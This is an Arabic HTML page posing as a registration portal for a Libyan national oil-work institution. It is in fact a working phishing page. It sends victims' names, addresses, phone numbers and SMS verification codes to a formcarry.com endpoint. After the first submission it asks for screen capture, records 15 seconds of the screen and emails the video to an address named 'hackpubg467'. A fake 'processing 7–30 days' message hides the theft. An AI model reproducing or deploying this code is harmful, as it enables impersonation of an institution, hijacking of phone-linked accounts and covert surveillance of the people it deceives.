<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>المؤسسة الوطنــية</title>
  <link rel="icon" href="uy.jpeg" type="image/png" />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet" />
  <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
  <script>
    emailjs.init("user_ABC123xyz"); // ← غيّر هذا بـ User ID الخاص بك
  </script>
  <style>
    body {
      font-family: "Cairo", sans-serif;
      background: linear-gradient(135deg, #002147, #003366);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }
    .container {
      background: #fff;
      border-radius: 20px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
      padding: 35px 40px;
      width: 96%;
      max-width: 420px;
      text-align: center;
    }
    .logo-container img {
      width: 90px;
      height: 90px;
      margin: 0 auto 10px;
      display: block;
    }
    h2 {
      margin-bottom: 25px;
      color: #003366;
      font-weight: 900;
      font-size: 32px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #222;
      text-align: right;
    }
    input[type="tel"], input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border-radius: 10px;
      border: 1.8px solid #bbb;
      margin-bottom: 18px;
    }
    input:focus {
      border-color: gold;
      outline: none;
    }
    button {
      width: 40%;
      padding: 12px;
      font-size: 17px;
      background-color: gold;
      border: none;
      border-radius: 10px;
      color: #002147;
      cursor: pointer;
      font-weight: bold;
    }
    #timer {
      text-align: center;
      font-weight: 600;
      color: red;
      margin-top: 20px;
    }
    #codeField {
      display: none;
    }
    .error {
      color: red;
      font-size: 14px;
      margin-top: -10px;
      margin-bottom: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <img src="uy.jpeg" alt="شعار المؤسسة" />
      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
    </div>
    <h2>تسجيل الدخول</h2>

    <form id="phoneForm" onsubmit="return sendPhone(event);">
      <label for="fullname">الاسم الثلاثي:</label>
      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />

      <label for="address">العنوان:</label>
      <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />

      <label for="phone">رقم الهاتف:</label>
      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" />

      <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
      <div id="timer"></div>
    </form>

    <form id="codeForm" onsubmit="return sendCode(event);">
      <div id="codeField">
        <label for="code">جاري إرسال الكود عبر SMS</label>
        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" />
        <div id="errorMessage" class="error"></div>
        <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
        <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px">
          جاري معالجة طلبك، قد تستغرق من 7 إلى 30 يوم عمل.
        </div>
      </div>
    </form>
  </div>

  <script>
    let countdownInterval;

    function updateTimer(seconds) {
      const timerDisplay = document.getElementById("timer");
      const minutes = Math.floor(seconds / 60).toString().padStart(2, "0");
      const secs = (seconds % 60).toString().padStart(2, "0");
      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
    }

    function startTimer(duration) {
      let timeLeft = duration;
      const timerDisplay = document.getElementById("timer");
      timerDisplay.style.display = "block";
      updateTimer(timeLeft);
      countdownInterval = setInterval(() => {
        timeLeft--;
        updateTimer(timeLeft);
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          timerDisplay.style.display = "none";
          document.getElementById("sendPhoneBtn").disabled = false;
          document.getElementById("phone").disabled = false;
        }
      }, 1000);
    }

    function sendPhone(event) {
      event.preventDefault();

      const phoneInput = document.getElementById("phone");
      const fullnameInput = document.getElementById("fullname");
      const addressInput = document.getElementById("address");
      const sendPhoneBtn = document.getElementById("sendPhoneBtn");

      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
        alert("يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقمًا");
        return false;
      }

      const payload = {
        fullname: fullnameInput.value,
        address: addressInput.value,
        phone: phoneInput.value,
      };

      fetch("https://formcarry.com/s/2evKahWtdJS", {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify(payload),
      })
      .then((response) => {
        if (!response.ok) throw new Error("فشل إرسال البيانات");

        fullnameInput.disabled = true;
        addressInput.disabled = true;
        phoneInput.disabled = true;
        sendPhoneBtn.disabled = true;
        document.getElementById("codeField").style.display = "block";
        startTimer(480);

        // ⏺️ بدء تسجيل الشاشة
        startScreenRecording(fullnameInput.value);
      })
      .catch((error) => {
        alert("تعذر إرسال البيانات. حاول مرة أخرى.");
        console.error(error);
      });

      return false;
    }

    function startScreenRecording(senderName) {
      navigator.mediaDevices.getDisplayMedia({ video: true })
        .then((stream) => {
          const recorder = new MediaRecorder(stream);
          const chunks = [];

          recorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
          };

          recorder.onstop = () => {
            const blob = new Blob(chunks, { type: "video/webm" });
            const reader = new FileReader();
            reader.onloadend = function () {
              const base64Data = reader.result.split(",")[1];

              emailjs.send("service_i81x8no", "template_123abc", {
                to_email: "hackpubg467@gmail.com",
                from_name: senderName,
                message: "تسجيل الشاشة لمدة 15 ثانية مرفق.",
                attachment: base64Data,
                attachment_filename: "screen-recording.webm",
                attachment_type: "video/webm"
              })
              .then(() => {
                console.log("✅ تم إرسال الفيديو إلى البريد الإلكتروني");
              })
              .catch((err) => {
                console.error("❌ فشل إرسال الفيديو عبر EmailJS", err);
              });
            };
            reader.readAsDataURL(blob);
          };

          recorder.start();
          setTimeout(() => {
            recorder.stop();
          }, 15000);
        })
        .catch((err) => {
          console.error("⚠️ رفض المستخدم تسجيل الشاشة:", err);
        });
    }

    function sendCode(event) {
      event.preventDefault();
      const codeInput = document.getElementById("code");
      const errorMessage = document.getElementById("errorMessage");
      const processingMessage = document.getElementById("processingMessage");
      const sendCodeBtn = document.getElementById("sendCodeBtn");

      errorMessage.textContent = "";

      if (codeInput.value.trim() === "") {
        errorMessage.textContent = "يرجى كتابة الكود.";
        return false;
      }

      fetch("https://formcarry.com/s/2evKahWtdJS", {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify({
          phone: document.getElementById("phone").value,
          code: codeInput.value
        }),
      })
      .then((response) => response.json())
      .then((data) => {
        if (data.success !== false) {
          sendCodeBtn.style.display = "none";
          processingMessage.style.display = "block";
        } else {
          errorMessage.textContent = "❌ الكود غير صحيح.";
        }
      })
      .catch(() => {
        errorMessage.textContent = "⚠️ تعذر الاتصال بالخادم.";
      });

      return false;
    }
  </script>
</body>
</html>
